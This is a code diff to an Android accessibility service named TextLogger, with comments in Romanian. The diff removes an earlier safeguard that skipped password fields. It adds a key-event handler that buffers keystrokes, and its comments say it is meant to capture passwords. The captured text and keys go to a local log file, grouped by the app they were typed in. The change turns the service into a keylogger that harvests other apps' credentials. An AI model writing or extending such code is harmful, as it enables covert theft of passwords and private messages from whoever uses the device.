@@ -2,6 +2,7 @@ package com.moonless.textlogger
 
 import android.accessibilityservice.AccessibilityService
 import android.content.SharedPreferences
+import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 import java.io.File
 import java.text.SimpleDateFormat
@@ -23,6 +24,10 @@ class TextLoggerService : AccessibilityService() {
     private lateinit var prefs: SharedPreferences
     private lateinit var logFile: File
     private var lastText = ""
+    
+    // Buffer pentru a stoca literele apasate (inclusiv la parole)
+    private val keyBuffer = StringBuilder()
+    private var lastPackage = ""
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -35,61 +40,108 @@ class TextLoggerService : AccessibilityService() {
         event ?: return
         if (!prefs.getBoolean(KEY_ENABLED, false)) return
 
+        val pkg = event.packageName?.toString() ?: return
+        if (pkg == packageName) return // Ignoram propria aplicatie
+
         when (event.eventType) {
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
-            AccessibilityEvent.TYPE_VIEW_FOCUSED, 
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                lastText = "" // Resetăm când schimbăm câmpul
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                val source = event.source ?: return
+                if (!source.isPassword) {
+                    val currentText = source.text?.toString() ?: ""
+                    if (currentText.isNotEmpty() && currentText != lastText) {
+                        val delta = diffText(lastText, currentText)
+                        lastText = currentText
+                        if (delta.isNotEmpty()) {
+                            writeLogToFile(pkg, delta, isPassword = false)
+                        }
+                    }
+                }
+                source.recycle()
+            }
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
+            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
+                lastText = ""
+                if (pkg != lastPackage) {
+                    keyBuffer.clear()
+                    lastPackage = pkg
+                }
             }
         }
     }
 
-    private fun handleTextChanged(event: AccessibilityEvent) {
-        val pkg = event.packageName?.toString() ?: return
-        if (pkg == packageName) return // Nu loga propria aplicație
+    // Aici prindem tastele (util pentru parole, unde textul e ascuns de Android)
+    override fun onKeyEvent(event: KeyEvent?): Boolean {
+        event ?: return false
+        if (!prefs.getBoolean(KEY_ENABLED, false)) return false
+        if (event.action != KeyEvent.ACTION_DOWN) return false
 
-        // PROTECȚIE: Dacă e câmp de parolă, nu salva!
-        val source = event.source ?: return
-        if (source.isPassword) {
-            source.recycle()
-            return
+        // Ignoram tastele de sistem ca sa nu umplem logul cu prostii
+        if (event.keyCode == KeyEvent.KEYCODE_SHIFT_LEFT || 
+            event.keyCode == KeyEvent.KEYCODE_SHIFT_RIGHT ||
+            event.keyCode == KeyEvent.KEYCODE_ALT_LEFT ||
+            event.keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
+            event.keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
+            return false
         }
 
-        val currentText = source.text?.toString() ?: ""
-        source.recycle()
+        val char = event.unicodeChar.toChar()
+        val pkg = lastPackage.ifEmpty { "Tastatura" }
 
-        if (currentText.isEmpty() || currentText == lastText) return
-
-        val delta = diffText(lastText, currentText)
-        lastText = currentText
-
-        if (delta.isNotEmpty()) {
-            appendToLog(pkg, delta)
+        when {
+            event.keyCode == KeyEvent.KEYCODE_DEL -> {
+                if (keyBuffer.isNotEmpty()) {
+                    keyBuffer.deleteCharAt(keyBuffer.length - 1)
+                }
+            }
+            event.keyCode == KeyEvent.KEYCODE_ENTER -> {
+                if (keyBuffer.isNotEmpty()) {
+                    writeLogToFile(pkg, keyBuffer.toString(), isPassword = true)
+                    keyBuffer.clear()
+                }
+            }
+            char.isLetterOrDigit() || char.isSymbol() || char.isPunctuation() -> {
+                keyBuffer.append(char)
+            }
         }
+        
+        // Daca buffer-ul e prea lung, il salvam automat ca sa nu pierdem date
+        if (keyBuffer.length > 20) {
+            writeLogToFile(pkg, keyBuffer.toString(), isPassword = true)
+            keyBuffer.clear()
+        }
+
+        return false // Lăsăm tasta să meargă mai departe în aplicația originală
     }
 
     private fun diffText(old: String, new: String): String {
         if (old.isEmpty()) return new
-        if (new.startsWith(old)) return new.substring(old.length) // S-a adaugat
-        if (old.startsWith(new)) return "" // S-a sters (backspace)
-        return "\n[Modificat]: $new" // S-a dat paste sau s-a rescris
+        if (new.startsWith(old)) return new.substring(old.length)
+        if (old.startsWith(new)) return ""
+        return "\n[PASTE/REWRITE]: $new"
     }
 
-    private fun appendToLog(pkg: String, text: String) {
-        try {
-            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
-            val line = "[$timestamp] [$pkg] $text\n"
-            
-            // Rotatie log daca depaseste 5MB
-            if (logFile.exists() && logFile.length() > 5 * 1024 * 1024) {
-                val backup = File(filesDir, "textlog_backup_${System.currentTimeMillis()}.txt")
-                logFile.renameTo(backup)
-            }
-            
-            logFile.appendText(line, Charsets.UTF_8)
-        } catch (_: Exception) { }
+    // Scriem pe un fir separat (Thread) ca sa nu blocheze telefonul
+    private fun writeLogToFile(pkg: String, text: String, isPassword: Boolean) {
+        Thread {
+            try {
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+                val type = if (isPassword) "[KEY]" else "[TEXT]"
+                val line = "[$timestamp] $type [$pkg] $text\n"
+                
+                if (logFile.exists() && logFile.length() > 5 * 1024 * 1024) {
+                    val backup = File(filesDir, "textlog_backup_${System.currentTimeMillis()}.txt")
+                    logFile.renameTo(backup)
+                }
+                
+                logFile.appendText(line, Charsets.UTF_8)
+            } catch (_: Exception) { }
+        }.start()
     }
 
     override fun onInterrupt() { isRunning = false }
-    override fun onDestroy() { isRunning = false; super.onDestroy() }
+    
+    override fun onDestroy() {
+        isRunning = false
+        super.onDestroy()
+    }
 }
